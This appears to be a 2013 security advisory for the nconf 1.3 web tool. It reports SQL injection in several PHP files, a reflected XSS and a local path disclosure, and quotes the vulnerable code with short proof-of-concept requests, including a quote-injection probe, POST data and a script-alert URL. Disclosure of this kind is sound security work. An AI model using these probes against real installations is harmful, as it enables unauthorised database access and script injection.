# Date: 2013/3/4
# Exploit Author: Saadat Ullahï¼Œsaadi_linux@rocketmail.com
# Software Link:  http://sourceforge.net/projects/nconf/files/nconf/
# Vendors:    http://www.nconf.org/
# Author HomePage: http://security-geeks.blogspot.com/
# Version:    nconf 1.3
# Tested on: Server: Apache/2.2.15 (Centos)  PHP/5.3.3

Nconf Is vulnerable to Sql injection in most of the files , they did&#039;nt sanitize any GET POST FILEDs.
Some OF them Are

Blind Sqli In handle_item.php on Id parameter
handle_item.php?id=1&#039;
P0c
$query2 .= &#039;   AND id_item <> &#039;.$_GET["id"];


delete_attr.php
POST DATA : id=15&#039;&name=&delete=yes&submit=Delete
Poc
Id Via GEt FIELD
$query = &#039;SELECT attr_name, config_class FROM ConfigAttrs, ConfigClasses WHERE id_attr=&#039;.$_GET["id"].&#039; AND fk_id_class=ConfigClasses.id_class&#039;;
And id via Post Field
$query = &#039;DELETE FROM ConfigAttrs
                WHERE id_attr=&#039;.$_POST["id"];

clone_host_write2db.php
Again On id paramerter.
Their are Many more...

A Simple Reflected XSS 
http://localhost/nconf/handle_item.php?item=<script>alert(&#039;Hi&#039;);</script>
Poc
$item_class = $_GET["item"];
.
.
echo without Sanitization
echo &#039;<h2>&#039;.ucfirst($handle_action).&#039; &#039;.$item_class.&#039;</h2>&#039;;

A LocalPath Disclose
http://localhost/nconf/call_file.php?ajax_file=service_list.php&debug=yes
Post Data:
host_id=5372&highlight_service=5373&class=a


#Independent Pakistani Security Researcher

